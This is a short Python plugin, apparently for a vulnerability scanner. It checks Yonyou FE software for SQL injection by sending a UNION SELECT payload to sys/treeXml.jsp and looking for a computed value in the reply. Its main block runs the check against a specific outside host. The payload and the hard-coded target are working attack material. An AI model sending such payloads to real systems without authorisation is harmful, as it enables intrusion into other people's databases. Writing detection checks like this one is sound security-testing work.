#/usr/bin/python
#-*- coding: utf-8 -*-

def assign(service, arg):
    if service == "yongyou_fe":
        return True, arg    

def audit(arg):
    url = arg + "sys/treeXml.jsp?Si06=1%27+UNION+ALL+SELECT+1,21312313231231-23123121,1,1,1,1,1,1,1,1,1,1,1,1--&type=sort"
    code, head, body, errcode, _url = curl.curl2(url)
    if code == 200 and '21312290108110' in body: 
        security_hole(url)
            
    
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_fe', 'http://fe.hy-la.com:8088/')[1])